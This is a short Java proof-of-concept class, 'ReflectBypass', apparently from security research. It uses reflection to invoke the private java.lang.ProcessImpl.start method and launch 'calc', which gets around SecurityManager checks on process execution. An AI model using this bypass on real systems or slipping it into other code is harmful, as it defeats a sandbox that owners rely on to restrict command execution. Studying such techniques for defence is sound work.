package com.SugarP1g.securityManager;

import java.lang.reflect.Method;
import java.util.Map;

public class ReflectBypass {

    public static void main(String[] args) throws Exception {
        System.out.println("[*]Running reflectProcessImpl()");
        reflectProcessImpl("calc");
    }

    public static void reflectProcessImpl(String command) throws Exception {
        Class clz = Class.forName("java.lang.ProcessImpl");
        Method method = clz.getDeclaredMethod("start", String[].class, Map.class, String.class, ProcessBuilder.Redirect[].class, boolean.class);
        method.setAccessible(true);
        method.invoke(clz, new String[]{command}, null, null, null, false);
    }
}
